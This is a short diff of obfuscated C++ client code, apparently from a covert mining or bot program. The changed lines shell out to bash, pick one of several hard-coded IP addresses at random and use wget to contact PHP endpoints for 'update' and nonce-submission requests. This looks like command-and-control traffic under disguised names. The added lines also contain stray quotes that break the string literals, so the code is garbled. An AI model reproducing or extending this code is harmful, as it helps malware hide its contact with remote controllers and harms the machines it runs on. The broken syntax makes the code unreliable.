@@ -969,7 +969,7 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     //response = GetStdoutFromCommand("wget -N -q http://linux84.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=info");
 
-    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[3]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];echo "http://${arr[$rand]}/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com");
+    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[3]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];echo "http://${arr[$rand]}/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com"");
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -1015,7 +1015,7 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     
     //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://linux84.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=submitNonce");
     
-    string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux84";
+    string url = GetStdoutFromCommand("arr[0]='194.113.74.217';arr[1]='94.237.30.197';arr[2]='94.237.61.188';arr[3]='209.151.148.100';arr[3]='194.113.72.197';rand=$[$RANDOM % ${#arr[@]}];echo "http://${arr[$rand]}/linux8474.php?linux84=linux84"");
     
     string response;
     
